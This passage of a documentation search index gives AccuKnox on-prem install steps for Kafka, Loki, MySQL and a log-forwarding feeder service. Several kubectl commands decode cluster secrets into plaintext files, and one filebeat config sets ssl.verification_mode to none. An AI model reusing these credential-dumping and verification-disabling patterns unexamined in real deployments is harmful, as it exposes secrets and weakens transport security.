= '{.data.ca\\.password}' -n accuknox-kafka | base64 -d > ca.password Get User Cert \u00b6 kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath = '{.data.user\\.p12}' | base64 -d > user.p12 Get user password \u00b6 kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath = '{.data.user\\.password}' | base64 -d > user.password Convert user.p12 into base64 \u00b6 cat user.p12 | base64 > user.p12.base64 Convert ca.p12 into base64 \u00b6 cat ca.p12 | base64 > ca.p12.base64 Convert ca.password into base64 \u00b6 cat ca.password | base64 > ca.password.base64 Convert user.password into base64 \u00b6 cat user.password | base64 > user.password.base64 Convert p12 to pem \u00b6 openssl pkcs12 -in ca.p12 -out ca.pem Note: copy the password from ca.password (file) Convert ca.pem to base64 \u00b6 cat ca.pem | base64 > ca.pem.base64 Note: ca.p12, ca.password, user.p12 and user.password are required to be used in Java based applications. For Go based applications, use ca.pem, user.p12 and user.password. For use in Kubernetes, use the base64 versions of respective files. FQDN (K8\u2019s Service name) Value for Internal Cluster application connectivity. FQDN : accuknox-kafka-bootstrap.accuknox-kafka.svc.cluster.local:9092 Get Certificates and store it \u00b6 NOTE: If kafka cluster is upgraded or reinstalled, then cluster will generate new certificates and you need to change/update key-pair in the kafka clients or applications. To mitigate this issue store these below certificates in safe place at the time of installing kafka(first time installation). Manually apply these certificates using \"kubectl\" command or place under templetes folder. And also turn off the auto certificate generation by configuring(uncomment) \"clusterca\" and \"clientsca\" to \"false\" in \"kafka-cluster.yaml\" file(below image is for your reference). Once done the changes, install/upgarde the cluster. kubectl get secret/accuknox-clients-ca -o yaml -n accuknox-kafka > accuknox-clients-ca.yaml kubectl get secret/accuknox-clients-ca-cert -o yaml -n accuknox-kafka > accuknox-clients-ca-cert.yaml kubectl get secret/accuknox-cluster-ca-cert -o yaml -n accuknox-kafka > accuknox-cluster-ca-cert.yaml kubectl get secret/accuknox-cluster-ca -o yaml -n accuknox-kafka > accuknox-cluster-ca.yaml kubectl get secret/node-event-feeder -o yaml -n accuknox-kafka > node-event-feeder.yaml kubectl get secret/node-event-feeder-common -o yaml -n accuknox-kafka > node-event-feeder-common.yaml","title":"Kafka install"},{"location":"accuknox-onprem/kafka-install/#note","text":"Kafka Operator Deployment 1. Don't change the namespace name because if you change the namespace - You need to change the service name , If the service name is changed ,then you need to change the microservice configmap files . eg: app.yaml. Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and labels Taints - kafka:true Labels - kafka:true","title":"Note:"},{"location":"accuknox-onprem/kafka-install/#installing-helm","text":"This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.","title":"Installing Helm"},{"location":"accuknox-onprem/kafka-install/#from-the-binary-releases","text":"Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here.. Add accuknox repository to install strimzi-kafka-operator helm package: helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites helm repo update helm search repo accuknox-onprem-prerequisites helm pull accuknox-onprem-prerequisites/strimzi-kafka-operator --untar kubectl create namespace accuknox-kafka helm install accuknox-kafka strimzi-kafka-operator -n accuknox-kafka Check the Pods deployment kubectl get pods -n accuknox-kafka Extract the connectivity information.","title":"From the Binary Releases"},{"location":"accuknox-onprem/kafka-install/#get-bootstrap-server-endpoint","text":"kubectl get kafka accuknox-kafka -o jsonpath = '{.status.listeners[?(@.type==\"external\")].bootstrapServers}' -n accuknox-kafka","title":"Get bootstrap server endpoint"},{"location":"accuknox-onprem/kafka-install/#get-ca","text":"kubectl get secret accuknox-kafka-cluster-ca-cert -o jsonpath = '{.data.ca\\.p12}' -n accuknox-kafka | base64 -d > ca.p12 Note: For any application connecting to Kafka outside the GKE, It needs to communicate via SSL/TLS authentication. We need to provide the connectivity details to the component owners who are configuring the application deployed outside GKE Cluster..","title":"Get CA"},{"location":"accuknox-onprem/kafka-install/#get-ca-password","text":"kubectl get secret accuknox-kafka-cluster-ca-cert -o jsonpath = '{.data.ca\\.password}' -n accuknox-kafka | base64 -d > ca.password","title":"Get CA Password"},{"location":"accuknox-onprem/kafka-install/#get-user-cert","text":"kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath = '{.data.user\\.p12}' | base64 -d > user.p12","title":"Get User Cert"},{"location":"accuknox-onprem/kafka-install/#get-user-password","text":"kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath = '{.data.user\\.password}' | base64 -d > user.password","title":"Get user password"},{"location":"accuknox-onprem/kafka-install/#convert-userp12-into-base64","text":"cat user.p12 | base64 > user.p12.base64","title":"Convert user.p12 into base64"},{"location":"accuknox-onprem/kafka-install/#convert-cap12-into-base64","text":"cat ca.p12 | base64 > ca.p12.base64","title":"Convert ca.p12 into base64"},{"location":"accuknox-onprem/kafka-install/#convert-capassword-into-base64","text":"cat ca.password | base64 > ca.password.base64","title":"Convert ca.password into base64"},{"location":"accuknox-onprem/kafka-install/#convert-userpassword-into-base64","text":"cat user.password | base64 > user.password.base64","title":"Convert user.password into base64"},{"location":"accuknox-onprem/kafka-install/#convert-p12-to-pem","text":"openssl pkcs12 -in ca.p12 -out ca.pem Note: copy the password from ca.password (file)","title":"Convert p12 to pem"},{"location":"accuknox-onprem/kafka-install/#convert-capem-to-base64","text":"cat ca.pem | base64 > ca.pem.base64 Note: ca.p12, ca.password, user.p12 and user.password are required to be used in Java based applications. For Go based applications, use ca.pem, user.p12 and user.password. For use in Kubernetes, use the base64 versions of respective files. FQDN (K8\u2019s Service name) Value for Internal Cluster application connectivity. FQDN : accuknox-kafka-bootstrap.accuknox-kafka.svc.cluster.local:9092","title":"Convert ca.pem to base64"},{"location":"accuknox-onprem/kafka-install/#get-certificates-and-store-it","text":"NOTE: If kafka cluster is upgraded or reinstalled, then cluster will generate new certificates and you need to change/update key-pair in the kafka clients or applications. To mitigate this issue store these below certificates in safe place at the time of installing kafka(first time installation). Manually apply these certificates using \"kubectl\" command or place under templetes folder. And also turn off the auto certificate generation by configuring(uncomment) \"clusterca\" and \"clientsca\" to \"false\" in \"kafka-cluster.yaml\" file(below image is for your reference). Once done the changes, install/upgarde the cluster. kubectl get secret/accuknox-clients-ca -o yaml -n accuknox-kafka > accuknox-clients-ca.yaml kubectl get secret/accuknox-clients-ca-cert -o yaml -n accuknox-kafka > accuknox-clients-ca-cert.yaml kubectl get secret/accuknox-cluster-ca-cert -o yaml -n accuknox-kafka > accuknox-cluster-ca-cert.yaml kubectl get secret/accuknox-cluster-ca -o yaml -n accuknox-kafka > accuknox-cluster-ca.yaml kubectl get secret/node-event-feeder -o yaml -n accuknox-kafka > node-event-feeder.yaml kubectl get secret/node-event-feeder-common -o yaml -n accuknox-kafka > node-event-feeder-common.yaml","title":"Get Certificates and store it"},{"location":"accuknox-onprem/kafka-purpose/","text":"Strimzi simplifies the process of running Apache Kafka in a Kubernetes cluster. Features \u00b6 The underlying data stream-processing capabilities and component architecture of Kafka can deliver: Microservices and other applications to share data with extremely high throughput and low latency Message ordering guarantees Message rewind/replay from data storage to reconstruct an application state Message compaction to remove old records when using a key-value log Horizontal scalability in a cluster configuration Replication of data to control fault tolerance Retention of high volumes of data for immediate access For more reference: click here..","title":"Kafka purpose"},{"location":"accuknox-onprem/kafka-purpose/#features","text":"The underlying data stream-processing capabilities and component architecture of Kafka can deliver: Microservices and other applications to share data with extremely high throughput and low latency Message ordering guarantees Message rewind/replay from data storage to reconstruct an application state Message compaction to remove old records when using a key-value log Horizontal scalability in a cluster configuration Replication of data to control fault tolerance Retention of high volumes of data for immediate access For more reference: click here..","title":"Features"},{"location":"accuknox-onprem/kafka-verify/","text":"Check Kafka Cluster status: kubectl get kafka -n accuknox-kafka Check kafka workloads status: kubectl get all -n accuknox-kafka","title":"Kafka verify"},{"location":"accuknox-onprem/loki-install/","text":"Installing Helm \u00b6 This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases. From the Binary Releases \u00b6 Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here.. Add accuknox repository to install Loki helm package: helm repo add accuknox-onprem-logging https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-logging helm repo update helm search repo accuknox-onprem-logging helm pull accuknox-onprem-logging/loki-stack --untar kubectl create namespace accuknox-loki-logging kubectl config set-context --current --namespace = accuknox-loki-logging helm install loki loki-stack/","title":"Loki install"},{"location":"accuknox-onprem/loki-install/#installing-helm","text":"This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.","title":"Installing Helm"},{"location":"accuknox-onprem/loki-install/#from-the-binary-releases","text":"Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here.. Add accuknox repository to install Loki helm package: helm repo add accuknox-onprem-logging https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-logging helm repo update helm search repo accuknox-onprem-logging helm pull accuknox-onprem-logging/loki-stack --untar kubectl create namespace accuknox-loki-logging kubectl config set-context --current --namespace = accuknox-loki-logging helm install loki loki-stack/","title":"From the Binary Releases"},{"location":"accuknox-onprem/loki-purpose/","text":"Loki is a log aggregation tool, and it is the core of a fully-featured logging stack. Loki is a datastore optimized for efficiently holding log data. A Loki-based logging stack consists of 3 components: Fluent bit is daemonset its running in each node to get the logs. Promtail is the agent, responsible for gathering logs and sending them to Loki. Loki is the main server, responsible for storing logs and processing queries.","title":"Loki purpose"},{"location":"accuknox-onprem/loki-verify/","text":"Check the Pods deployment kubectl get pods -n accuknox-loki-logging Add endpoint in grafana datasourceCheck the Pods deployment kubectl get pods -n accuknox-loki-logging Add endpoint in grafana datasource","title":"Loki verify"},{"location":"accuknox-onprem/mysql-install/","text":"Note: \u00b6 Don't change the namespace name because if you change the namespace - You need to change the service name , If the service name is changed ,then you need to change the microservice configmap files . eg: app.yaml. Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and labels Taints - mysql:true Labels - mysql:true Installing Helm \u00b6 This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases. From the Binary Releases \u00b6 Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here.. Add accuknox repository to install Mysql Percona helm package: helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites helm repo update helm search repo accuknox-onprem-prerequisites helm pull accuknox-onprem-prerequisites/mysql-chart --untar kubectl create namespace accuknox-mysql cd mysql-chart kubectl apply -f bundle.yaml -n accuknox-mysql kubectl apply -f cr.yaml -n accuknox-mysql kubectl apply -f secrets.yaml -n accuknox-mysql kubectl apply -f ssl-secrets.yaml -n accuknox-mysql kubectl apply -f backup-s3.yaml -n accuknox-mysql Loading schema \u00b6 helm pull accuknox-onprem-prerequisites/mysql-schema-chart --untar helm upgrade --install accuknox-mysql-schema mysql-schema-chart -n accuknox-mysql kubectl get pods -n accuknox-mysql Note \u00b6 To configure backup with gcs, add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and change the cron job entries as per the requirement in the cr.yaml. HMAC Keys will vary for cloud providers . (GCP, AZURE, AWS) After following steps the above steps, you will see a similar image as above Run a sanitary test with below commands at the mysql namespace kubectl run -i --rm --tty percona-client --image = percona:8.0 --restart = Never -n accuknox-mysql -- bash -il mysql -h accuknox-mysql-haproxy -uroot -proot_password Update the passwords in secret.yaml file and run below command kubectl apply -f secrets.yaml Optional To configure backup with gcs add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and cron can be changed as required cr.yaml files. FQDN: For K8\u2019s Service name accuknox-mysql-haproxy.accuknox-mysql.svc.cluster.local \u00b6","title":"Mysql install"},{"location":"accuknox-onprem/mysql-install/#note","text":"Don't change the namespace name because if you change the namespace - You need to change the service name , If the service name is changed ,then you need to change the microservice configmap files . eg: app.yaml. Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and labels Taints - mysql:true Labels - mysql:true","title":"Note:"},{"location":"accuknox-onprem/mysql-install/#installing-helm","text":"This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.","title":"Installing Helm"},{"location":"accuknox-onprem/mysql-install/#from-the-binary-releases","text":"Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed. Download your desired version Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz) Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm) Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question. For more reference: Click here.. Add accuknox repository to install Mysql Percona helm package: helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites helm repo update helm search repo accuknox-onprem-prerequisites helm pull accuknox-onprem-prerequisites/mysql-chart --untar kubectl create namespace accuknox-mysql cd mysql-chart kubectl apply -f bundle.yaml -n accuknox-mysql kubectl apply -f cr.yaml -n accuknox-mysql kubectl apply -f secrets.yaml -n accuknox-mysql kubectl apply -f ssl-secrets.yaml -n accuknox-mysql kubectl apply -f backup-s3.yaml -n accuknox-mysql","title":"From the Binary Releases"},{"location":"accuknox-onprem/mysql-install/#loading-schema","text":"helm pull accuknox-onprem-prerequisites/mysql-schema-chart --untar helm upgrade --install accuknox-mysql-schema mysql-schema-chart -n accuknox-mysql kubectl get pods -n accuknox-mysql","title":"Loading schema"},{"location":"accuknox-onprem/mysql-install/#note_1","text":"To configure backup with gcs, add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and change the cron job entries as per the requirement in the cr.yaml. HMAC Keys will vary for cloud providers . (GCP, AZURE, AWS) After following steps the above steps, you will see a similar image as above Run a sanitary test with below commands at the mysql namespace kubectl run -i --rm --tty percona-client --image = percona:8.0 --restart = Never -n accuknox-mysql -- bash -il mysql -h accuknox-mysql-haproxy -uroot -proot_password Update the passwords in secret.yaml file and run below command kubectl apply -f secrets.yaml Optional To configure backup with gcs add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and cron can be changed as required cr.yaml files. FQDN: For K8\u2019s Service name","title":"Note"},{"location":"accuknox-onprem/mysql-install/#accuknox-mysql-haproxyaccuknox-mysqlsvcclusterlocal","text":"","title":"accuknox-mysql-haproxy.accuknox-mysql.svc.cluster.local"},{"location":"accuknox-onprem/mysql-purpose/","text":"Percona Distribution for Mysql Operator is an open-source drop in replacement for MySQL Enterprise with synchronous replication running on Kubernetes. It automates the deployment and management of the members in your Percona XtraDB Cluster environment. It can be used to instantiate a new Percona XtraDB Cluster, or to scale an existing environment. Consult the documentation on the Percona Distribution for Mysql Operator for complete details on capabilities and options. Supported Features \u00b6 Scale Your Cluster change the size parameter to add or remove members of the cluster. Three is the minimum recommended size for a functioning cluster. Automate Your Backups configure cluster backups to run on a scheduled basis. Backups can be stored on a persistent volume or S3-compatible storage. Leverage Point-in-time recovery to reduce RPO/RTO. Proxy integration choose HAProxy or ProxySQL as a proxy in front of the Percona XtraDB Cluster. Proxies are deployed and configured automatically with the Operator. Common Configurations \u00b6 Set Resource Limits - set limitation on requests to CPU and memory resources. Customize Storage - set the desired Storage Class and Access Mode for your database cluster data. Control Scheduling - define how your PXC Pods are scheduled onto the K8S cluster with tolerations, pod disruption budgets, node selector and affinity settings. Automatic synchronization of MySQL users with ProxySQL Fully automated minor version updates (Smart Update) Update Reader members before Writer member at cluster upgrades For more reference: click here..","title":"Mysql purpose"},{"location":"accuknox-onprem/mysql-purpose/#supported-features","text":"Scale Your Cluster change the size parameter to add or remove members of the cluster. Three is the minimum recommended size for a functioning cluster. Automate Your Backups configure cluster backups to run on a scheduled basis. Backups can be stored on a persistent volume or S3-compatible storage. Leverage Point-in-time recovery to reduce RPO/RTO. Proxy integration choose HAProxy or ProxySQL as a proxy in front of the Percona XtraDB Cluster. Proxies are deployed and configured automatically with the Operator.","title":"Supported Features"},{"location":"accuknox-onprem/mysql-purpose/#common-configurations","text":"Set Resource Limits - set limitation on requests to CPU and memory resources. Customize Storage - set the desired Storage Class and Access Mode for your database cluster data. Control Scheduling - define how your PXC Pods are scheduled onto the K8S cluster with tolerations, pod disruption budgets, node selector and affinity settings. Automatic synchronization of MySQL users with ProxySQL Fully automated minor version updates (Smart Update) Update Reader members before Writer member at cluster upgrades For more reference: click here..","title":"Common Configurations"},{"location":"accuknox-onprem/mysql-verify/","text":"kubectl run -i --rm --tty percona-client --image = percona:8.0 --restart = Never -- bash -il mysql -h service name -u [ user ] -p [ password ] show databases ;","title":"Mysql verify"},{"location":"accuknox-onprem/onprem-feeder/","text":"Overview \u00b6 On Prem Feeder The On-Prem Feeder provides the feasibility of pushing the agent logs to Elastic Host using beats and feeder agent . The feeder agent also has the capability of pushing metrics into On Prem Prometheus. Prometheus collects and stores its metrics as time series data i.e., metrics information is stored with the timestamp at which it was recorded, alongside optional key-value pairs called labels . Elasticsearch is a search and analytics engine. It is an open source, full-text search and analysis engine, based on the Apache Lucene search engine. Logstash is a log aggregator that collects data from various input sources, executes different transformations and enhancements and then ships the data to various supported output destinations. Kibana is a visualization layer that works on top of Elasticsearch, providing users with the ability to analyze and visualize the data. And last but not least \u2014 Beats are lightweight agents that are installed on edge hosts to collect different types of data for forwarding into the stack. Step 1: Installation of Feeder Service (On Prem Without ELK) \u00b6 As we are passing the elastic and kibana resource in the values.yaml of the feeder service , we can toggle the elastic/kibana installation along with feeder-service as below. helm repo add accuknox-onprem-agents https://USERNAME:password@onprem.accuknox.com/repository/accuknox-onprem-agents helm repo update helm search repo accuknox-onprem-agents kubectl create ns accuknox-feeder-service helm upgrade --install --set elastic.enabled = false --set kibana.enabled = false accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service Step 2: Installation of Feeder Service (On Prem With ELK) \u00b6 Enable the elastic resource as true to install Elastic along with feeder. helm upgrade --install --set elasticsearch.enabled=true --set kibana.enabled=true accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service (OR) Refer the page for Installation of Elastic . Note: If there is ELK set up already running on the cluster, the CRD apply may fail. The Elastic master and data pods should be in up and running state on the same namespace. Step 3: View Metrics \u00b6 Feeder as a SERVER Toggle the below variable for to push metrics directly to an endpoint. GRPC_SERVER_ENABLED value : true Once the feeder agent starts running, the metrics should start flowing up. Please use localhost:8000/metrics endpoint to check metrics flow. Feeder as a CLIENT Please toggle the below variable for to push metrics to GRPC Server in SAAS Platform / Client Platform. GRPC_CLIENT_ENABLED value : true GRPC_SERVER_URL value : \"<grpc_server_host>\" GRPC_SERVER_PORT value : \"<grpc_server_port>\" Once the feeder agent starts running, the metrics will be pushed to prometheus. Note: All of the above can be updated runtime as in Step 4.3 3.1 Installation of Prometheus \u00b6 Refer the page for Installation of Prometheus . 3.2 Prometheus Configuration \u00b6 Add the below configuration in prometheus (on Prem) to see the agent metrics in Prometheus job_name : <feeder>-chart honor_timestamps : true scrape_interval : 30s scrape_timeout : 10s metrics_path : /metrics scheme : http follow_redirects : true static_configs : - targets : - <localhost>:8000 Note: Alternatively, the target can be any GRPC Server host / port. (In case of Feeder Client) 3.3. Metrics Labelling (Prometheus) \u00b6 The Cilium metrics can be seen under the below label cilium_<metricname> ( Eg, cilium_http_requests_total ) The Kubearmor metrics can be seen under the below label kubearmor_<metricname> ( Eg, kubearmor_action_requests_total ) The Vae metrics can be seen under the below label vae_<metricname> ( Eg, vae_Proc_Count_API_requests_total ) Step 4: Forwarding Logs to Elastic \u00b6 4.1. Beats Setup \u00b6 The Beats agent will be spinned along with Filebeat running along as a sidecar. The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana . The logs are forwarded to Elastic when the below env variable is enabled. - name : ELASTIC_FEEDER_ENABLED value : true 4.2. Elastic Configuration Parameters: \u00b6 We will create a ConfigMap named filebeat-configmap with the content of filebeat.yml file. kind : ConfigMap metadata : name : filebeat-configmap data : filebeat.yml : | filebeat.inputs: - type: log # Change to true to enable this input configuration. enabled: true # Paths that should be crawled and fetched. Glob based paths. paths: - /var/log/*.log output.elasticsearch: hosts: ${ELASTICSEARCH_HOST} username: ${ELASTICSEARCH_USERNAME} password: ${ELASTICSEARCH_PASSWORD} ssl.verification_mode: none The below Configuration parameters can be updated for elastic configuration. (If Default params needs to be modified) - name : ELASTICSEARCH_HOST value : https://<svc-name> - name : ELASTICSEARCH_PORT value : \"<svc-port>\" - name : ELASTICSEARCH_USERNAME value : \"elastic\" - name : ELASTICSEARCH_PASSWORD value : \"<elastic-password>\" To get elastic password kubectl get secret elasticsearch-es-elastic-user -o go-template = '{{.data.elastic | base64decode}}' -n namespace 4.3. Updating Elastic Search Host (Runtime):(If required to switch different Elastic host) \u00b6 kubectl set env deploy/feeder-service -n accuknox-feeder-service ELASTICSEARCH_HOST = \"https://elasticsearch-es-http.test-feed.svc.cluster.local:9200\" ELASTICSEARCH_USERNAME = elastic ELASTICSEARCH_PASSWORD = xxxxxxxxxx Note: Likewise other configuration parameters can be updated in Runtime. 4.4. Update Log Path: \u00b6 To view logs please use the below command kubectl exec -it -n accuknox-feeder-service pod/<podname> -c filebeat-sidecar -- /bin/bash To Update the Log path configured, please modify the below log input path under file beat inputs. filebeat.inputs : - type : container paths : - /log_output/cilium.log Step 5: Forwarding Logs to Splunk \u00b6 The logs are forwarded to Splunk when the below env variable is enabled. - name : SPLUNK_FEEDER_ENABLED value : true The below Configuration parameters can be updated for Splunk configuration. (If Default params needs to be modified) - name : SPLUNK_FEEDER_URL value : https://<splunk-host> - name : SPLUNK_FEEDER_TOKEN value : \"Token configured on HEC in Splunk App\" - name : SPLUNK_FEEDER_SOURCE_TYPE value : \"Source Type configured on HEC in Splunk App\" - name : SPLUNK_FEEDER_SOURCE value : \"Splunk Source configured on HEC in Splunk App\" - name : SPLUNK_FEEDER_INDEX value : \"Splunk Index configured on HEC in Splunk App\" 5.1. Enabling/Disabling Splunk (Runtime): \u00b6 kubectl set env deploy/feeder -n feeder-service SPLUNK_FEEDER_ENABLED = \"true\" By enabling the flag to true (as above), the logs will be pushed to Splunk.Conversely disabling it to \"false\" will stop pushing logs. Note: Likewise other configuration parameters can be updated in Runtime.","title":"Forwarding metrics to On-prem Feeder"},{"location":"accuknox-onprem/onprem-feeder/#overview","text":"On Prem Feeder The On-Prem Feeder provides the feasibility of pushing the agent logs to Elastic Host using beats and feeder agent . The feeder agent also has the capability of pushing metrics into On Prem Prometheus. Prometheus collects and stores its metrics as time series data i.e., metrics information is stored with the timestamp at which it was recorded, alongside optional key-value pairs called labels . Elasticsearch is a search and analytics engine. It is an open source, full-text search and analysis engine, based on the Apache Lucene search engine. Logstash is a log aggregator that collects data from various input sources, executes different transformations and enhancements and then ships the data to various supported output destinations. Kibana is a visualization layer that works on top of Elasticsearch, providing users with the ability to analyze and visualize the data. And last but not least \u2014 Beats are lightweight agents that are installed on edge hosts to collect different types of data for forwarding into the stack.","title":"Overview"},{"location":"accuknox-onprem/onprem-feeder/#step-1-installation-of-feeder-service-on-prem-without-elk","text":"As we are passing the elastic and kibana resource in the values.yaml of the feeder service , we can toggle the elastic/kibana installation along with feeder-service as below. helm repo add accuknox-onprem-agents https://USERNAME:password@onprem.accuknox.com/repository/accuknox-onprem-agents helm repo update helm search repo accuknox-onprem-agents kubectl create ns accuknox-feeder-service helm upgrade --install --set elastic.enabled = false --set kibana.enabled = false accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service","title":"Step 1: Installation of Feeder Service (On Prem Without ELK)"},{"location":"accuknox-onprem/onprem-feeder/#step-2-installation-of-feeder-service-on-prem-with-elk","text":"Enable the elastic resource as true to install Elastic along with feeder. helm upgrade --install --set elasticsearch.enabled=true --set kibana.enabled=true accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service (OR) Refer the page for Installation of Elastic . Note: If there is ELK set up already running on the cluster, the CRD apply may fail. The Elastic master and data pods should be in up and running state on the same namespace.","title":"Step 2: Installation of Feeder Service (On Prem With ELK)"},{"location":"accuknox-onprem/onprem-feeder/#step-3-view-metrics","text":"Feeder as a SERVER Toggle the below variable for to push metrics directly to an endpoint. GRPC_SERVER_ENABLED value : true Once the feeder agent starts running, the metrics should start flowing up. Please use localhost:8000/metrics endpoint to check metrics flow. Feeder as a CLIENT Please toggle the below variable for to push metrics to GRPC Server in SAAS Platform / Client Platform. GRPC_CLIENT_ENABLED value : true GRPC_SERVER_URL value : \"<grpc_server_host>\" GRPC_SERVER_PORT value : \"<grpc_server_port>\" Once the feeder agent starts running, the metrics will be pushed to prometheus. Note: All of the above can be updated runtime as in Step 4.3","title":"Step 3: View Metrics"},{"location":"accuknox-onprem/onprem-feeder/#31-installation-of-prometheus","text":"Refer the page for Installation of Prometheus .","title":"3.1 Installation of Prometheus"},{"location":"accuknox-onprem/onprem-feeder/#32-prometheus-configuration","text":"Add the below configuration in prometheus (on Prem) to see the agent metrics in Prometheus job_name : <feeder>-chart honor_timestamps : true scrape_interval : 30s scrape_timeout : 10s metrics_path : /metrics scheme : http follow_redirects : true static_configs : - targets : - <localhost>:8000 Note: Alternatively, the target can be any GRPC Server host / port. (In case of Feeder Client)","title":"3.2 Prometheus Configuration"},{"location":"accuknox-onprem/onprem-feeder/#33-metrics-labelling-prometheus","text":"The Cilium metrics can be seen under the below label cilium_<metricname> ( Eg, cilium_http_requests_total ) The Kubearmor metrics can be seen under the below label kubearmor_<metricname> ( Eg, kubearmor_action_requests_total ) The Vae metrics can be seen under the below label vae_<metricname> ( Eg, vae_Proc_Count_API_requests_total )","title":"3.3. Metrics Labelling (Prometheus)"},{"location":"accuknox-onprem/onprem-feeder/#step-4-forwarding-logs-to-elastic","text":"","title":"Step 4: Forwarding Logs to Elastic"},{"location":"accuknox-onprem/onprem-feeder/#41-beats-setup","text":"The Beats agent will be spinned along with Filebeat running along as a sidecar. The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana . The logs are forwarded to Elastic when the below env variable is enabled. - name : ELASTIC_FEEDER_ENABLED value : true","title":"4.1. Beats Setup"},{"location":"accuknox-onprem/onprem-feeder/#42-elastic-configuration-parameters","text":"We will create a ConfigMap named filebeat-configmap with the content of filebeat.yml file. kind : ConfigMap metadata : name : filebeat-configmap data : filebeat.yml : | filebeat.inputs: - type: log # Change to true to enable this input configuration. enabled: true # Paths that should be crawled and fetched. Glob based paths. paths: - /var/log/*.log output.elasticsearch: hosts: ${ELASTICSEARCH_HOST} username: ${ELASTICSEARCH_USERNAME} password: ${ELASTICSEARCH_PASSWORD} ssl.verification_mode: none The below Configuration parameters can be updated for elastic configuration. (If Default params needs to be modified) - name : ELASTICSEARCH_HOST value : https://<svc-name> - name : ELASTICSEARCH_PORT value : \"<svc-port>\" - name : ELASTICSEARCH_USERNAME value : \"elastic\" - name : ELASTICSEARCH_PASSWORD value : \"<elastic-password>\" To get elastic password kubectl get secret elasticsearch-es-elastic-user -o go-template = '{{.data.elastic | base64decode}}' -n namespace","title":"4.2. Elastic Configuration Parameters:"},{"location":"accuknox-onprem/onprem-feeder/#43-updating-elastic-search-host-runtimeif-required-to-switch-different-elastic-host","text":"kubectl set env deploy/feeder-service -n accuknox-feeder-service ELASTICSEARCH_HOST = \"https://elasticsearch-es-http.test-feed.svc.cluster.local:9200\" ELASTICSEARCH_USERNAME = elastic ELASTICSEARCH_PASSWORD = xxxxxxxxxx Note: Likewise other configuration parameters can be updated in Runtime.","title":"4.3. Updating Elastic Search Host (Runtime):(If required to switch different Elastic host)"},{"location":"accuknox-onprem/onprem-feeder/#44-update-log-path","text":"To view logs please use the below command kubectl exec -it -n accuknox-feeder-service pod/<podname> -c filebeat-sidecar -- /bin/bash To Update the Log path configured, please modify the below log input path under file beat inputs. filebeat.inputs : - type : container paths : - /log_output/cilium.log","title":"4.4. Update Log Path:"},{"location":"accuknox-onprem/onprem-feeder/#step-5-forwarding-logs-to-splunk","text":"The logs are forwarded to Splunk when the below env variable is enabled. - name : SPLUNK_FEEDER_ENABLED value : true The below Configuration parameters can be updated for Splunk configuration. (If Default params needs to be modified) - name : SPLUNK_FEEDER_URL value : https://<splunk-host> - name : SPLUNK_FEEDER_TOKEN value : \"Token configured on HEC in Splunk App\" - name : SPLUNK_FEEDER_SOURCE_TYPE value : \"Source Type configured on HEC in Splunk App\" - name : SPLUNK_FEEDER_SOURCE value : \"Splunk Source configured on HEC in Splunk 